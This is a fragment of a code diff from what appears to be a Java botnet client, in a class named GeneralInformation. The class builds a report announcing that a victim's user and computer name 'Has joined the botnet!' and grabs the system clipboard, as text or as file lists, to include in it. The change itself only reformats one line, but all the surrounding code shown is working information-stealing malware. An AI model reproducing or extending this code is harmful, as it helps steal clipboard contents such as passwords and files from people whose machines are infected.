@@ -21,7 +21,8 @@ public final class GeneralInformation implements JSONObject {
         content += "Hostname: " + System.getProperty("user.name") + "@" + System.getenv("COMPUTERNAME") + " Has joined the botnet!" + "\\n";
         try {
             String clipboard = String.valueOf(Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.stringFlavor));
-            if (Toolkit.getDefaultToolkit().getSystemClipboard().isDataFlavorAvailable(DataFlavor.stringFlavor) && content.length() <= 500 && clipboard.length() <= 1500) content += "Clipboard: " + clipboard + "\\n";
+            if (Toolkit.getDefaultToolkit().getSystemClipboard().isDataFlavorAvailable(DataFlavor.stringFlavor) && content.length() <= 500 && clipboard.length() <= 1500)
+                content += "Clipboard: " + clipboard + "\\n";
             else if (Toolkit.getDefaultToolkit().getSystemClipboard().isDataFlavorAvailable(DataFlavor.javaFileListFlavor)) {
                 String file = Arrays.toString(new String[]{String.valueOf(Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.javaFileListFlavor))});
                 ArrayList<File> validFileDirs = new ArrayList<>();
